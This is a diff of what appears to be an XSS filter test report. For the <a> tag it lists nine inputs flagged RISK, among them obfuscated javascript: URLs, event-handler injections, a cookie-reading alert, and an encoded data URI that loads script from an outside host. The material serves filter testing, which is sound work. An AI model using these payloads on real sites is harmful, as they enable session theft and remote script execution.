@@ -58,4 +58,21 @@ tag: <var>
 		RISK: <var onmouseover="prompt(1)">On Mouse Over</var>
 
 
-수행시간 17.154558초
+수행시간 17.154558초tag: <a>
+	TOTAL: 29
+	RISK : 9
+	SAFE : 20
+	AVG  : 31.0%
+
+	detail:
+		RISK: <a href="data:application/x-x509-user cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+		RISK: <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+		RISK: <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+		RISK: <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+		RISK: <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+		RISK: <math><a xlink:href="//jsfiddle.net/t846h/">click
+		RISK: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+		RISK: <math><a xlink:href="//jsfiddle.net/t846h/">click
+		RISK: <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+
+
